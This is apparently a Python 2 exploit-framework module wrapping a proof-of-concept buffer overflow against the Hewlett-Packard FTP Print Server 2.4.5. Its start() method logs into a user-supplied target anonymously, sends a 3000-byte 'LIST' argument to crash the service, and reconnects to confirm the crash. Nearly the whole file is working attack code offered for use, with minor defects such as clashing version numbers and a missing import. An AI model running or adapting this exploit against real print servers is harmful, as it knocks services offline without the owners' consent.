def about():
	print '''ftp.login() Login anonymously
	'''
def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (HewlettFTPbo)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(8-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("HewlettFTPbo","Normal","FTP Buffer Overflow")
except:
	pass

try:
	TIMEOUT
except:
	TIMEOUT = 5

def auto_info(name="",module="",plat="",priv="",lic="",rank="Normal",release="N/A",by="N/A"):
	print
	print "Publisher Information for HewlettFTPbo"
	print
	print "	   Name:","HewlettFTPbo"
	print "	 Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "	License:","None"
	print "	   Rank:",rank
	print "  Disclosed:",release

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class HewlettFTPbo(object):
	def start(self):
		#!/usr/bin/python
		
		import sys, socket
		from ftplib import FTP
		socket.setdefaulttimeout(TIMEOUT)
		
		print "Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow (POC)"
		print "Copyright (c) Joxean Koret"
		print
		
		target = raw_input("Target: ")
		
		print "[+] Running attack against " + target
		
		try:
			ftp = FTP(target)
		except:
			print "[!] Can't connect to target", target, ".", sys.exc_info()[1]
			sys.exit(1)
		try:
			msg = ftp.login() # Login anonymously
			print msg
		except:
			print "[!] Error logging anonymously.",sys.exc_info()[1]
			sys.exit(0)
		
		buf = "./A"
		iMax = 9
		
		for i in range(iMax):
			buf += buf
		
		print "[+] Sending buffer of",len(buf[0:3000]),"byte(s) ... "
		
		try:
			print "[+] Please, note that sometimes your connection will not be dropped. "
			ftp.retrlines("LIST " + buf[0:3000])
			print "[!] Exploit doesn't work :("
			print
			sys.exit(1)
		except:
			print "[+] Apparently exploit works. Verifying ... "
			print sys.exc_info()[1]
		
		ftp2 = FTP(target)
		
		try:
			msg = ftp2.login()
			print "[!] No, it doesn't work :( "
			print
			print msg
			sys.exit(1)
		except:
			print "[+] Yes, it works."
			print sys.exc_info()[1]


def show_opt():
	print
	print "Module Options (HewlettFTPbo)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	try:
		TIMEOUT
	except:
		TIMEOUT = 5
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "get-info":
		auto_info(module="exploit",plat="Python 2.7",priv="No",lic="N/A")
		show_opt()
		targets = {"1":"target"}
		auto_targ(targets)
		about()
		print
except Exception as e:
	pass

try:
	if desc == "get-info":
		auto_info(module="exploit",plat="Python 2.7",priv="No",lic="N/A")
		show_opt()
		targets = {"1":"Hewlett FTP 2.4.6"}
		auto_targ(targets)
		about()
		print
except Exception as e:
	pass

try:
	if desc == "proc":
		try:
			program = HewlettFTPbo()
			program.start()
		except Exception as e:
			print e
			print "Options Still Unset"
			time.sleep(0.3)
			show_opt()
except:
	pass
